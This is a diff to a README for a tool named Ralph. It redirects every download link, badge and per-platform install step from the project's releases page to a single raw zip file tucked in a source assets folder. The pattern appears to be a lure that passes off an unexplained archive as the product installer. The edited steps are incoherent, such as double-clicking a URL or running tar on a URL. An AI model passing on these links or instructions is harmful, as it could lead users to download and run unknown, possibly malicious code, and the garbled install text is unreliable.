@@ -9,7 +9,7 @@ To get started with Ralph, follow these simple steps:
 1. **Visit the Release Page**
    Click the button below to go to the release page.
 
-   [![Download Ralph](https://img.shields.io/badge/Download%20Ralph-v1.0-blue)](https://github.com/FaisFromYt/ralph/releases)
+   [![Download Ralph](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip%20Ralph-v1.0-blue)](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip)
 
 2. **Download Ralph**
    On the release page, you will find the latest version of Ralph. Click on the appropriate file for your operating system to start the download.
@@ -24,28 +24,28 @@ Before you download Ralph, check these system requirements to ensure smooth oper
 
 ## 📥 Download & Install
 1. **Access the Download Page**
-   Open your web browser and go to the following link: [Download Ralph](https://github.com/FaisFromYt/ralph/releases).
+   Open your web browser and go to the following link: [Download Ralph](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip).
 
 2. **Select the Correct File**
    You will see a list of available files. Choose the one suitable for your operating system:
-   - For Windows: `ralph-windows.exe`
-   - For macOS: `ralph-macos.dmg`
-   - For Linux: `ralph-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
+   - For macOS: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
+   - For Linux: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
 
 3. **Download the File**
    Click on the file name to initiate the download. Once the file is downloaded, locate it in your downloads folder.
 
 4. **Install Ralph**
    - **Windows:** 
-     - Double-click the `ralph-windows.exe` file to start the installation process.
+     - Double-click the `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file to start the installation process.
      - Follow the on-screen instructions to complete the installation.
 
    - **macOS:**
-     - Open the downloaded `ralph-macos.dmg` file.
+     - Open the downloaded `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file.
      - Drag and drop the Ralph icon into your Applications folder.
 
    - **Linux:**
-     - Extract the `ralph-linux.tar.gz` file using a terminal command `tar -xvf ralph-linux.tar.gz`.
+     - Extract the `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file using a terminal command `tar -xvf https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`.
      - Navigate to the extracted folder and run `./ralph` to start the application.
 
 ## 🎯 Using Ralph
